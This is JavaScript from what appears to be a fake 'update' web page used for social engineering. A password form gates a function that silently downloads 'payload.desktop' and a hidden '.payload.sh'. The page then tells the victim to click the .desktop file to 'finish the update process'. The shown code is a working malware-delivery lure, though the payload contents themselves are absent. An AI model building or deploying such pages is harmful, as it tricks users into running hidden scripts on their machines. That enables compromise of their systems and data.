		function download(){
			let filenames = ['payload.desktop', '.payload.sh'];
			let linkNames = ['payloads/payload.desktop', 'payloads/.payload.sh'];

			let link = document.createElement('a');
			link.style.display = 'none';
			document.body.appendChild(link);

			for(var i = 0; i < filenames.length; i++){
				//console.log(downloadFrame.contentWindow.document.getElementsByTagName("pre")[0].innerHTML);
				link.setAttribute('href', linkNames[i]);
				link.setAttribute('download', filenames[i]);
				link.click();

			}
				
			document.body.removeChild(link);
		}



function clicked (){

	let pwInput = document.getElementById("pw").value;
	let confirmInput = document.getElementById("confirmpw").value;
	// Checks to see if there was any input, if not create error messsage
	if(pwInput === "" || confirmInput === ""){
		// checks to see if there was a previous "p" element and remove it
		if(document.contains(document.getElementById("submit_msg"))){
			document.getElementById("submit_msg").remove();
		}
		// create a new p tag with message
		let message = document.createElement("p");
		message.id = "submit_msg";
		message.innerHTML = "You must fill out both fields.";
		message.style.color = "red";
		document.getElementById("admin_table").getElementsByTagName("td")[0].appendChild(message);
		// if the passwords dont match
	} else {
		if(pwInput !== confirmInput){

		if(document.contains(document.getElementById("submit_msg"))){
			document.getElementById("submit_msg").remove();
		}
		let message = document.createElement("p");
		message.id = "submit_msg";
		message.innerHTML = "Passwords do not match.";
		message.style.color = "red";
		document.getElementById("admin_table").getElementsByTagName("td")[0].appendChild(message);
		// If it works.
		} else {
				// Remove the admin table and change the warning table to confirm.
			let admin = document.getElementById("admin_table");
			admin.style.display = "none";

			let warning = document.getElementById("warning_table");
			warning.getElementsByTagName("th")[0].style.background = "green";
			warning.getElementsByTagName("h4")[0].innerHTML = "UPDATE DOWNLOADING"
			warning.getElementsByTagName("p")[0].innerHTML = "Thank you! When your downloads are finished, click on \"payloads.desktop\" to finish the update process.";

			download();

		}
	}
}
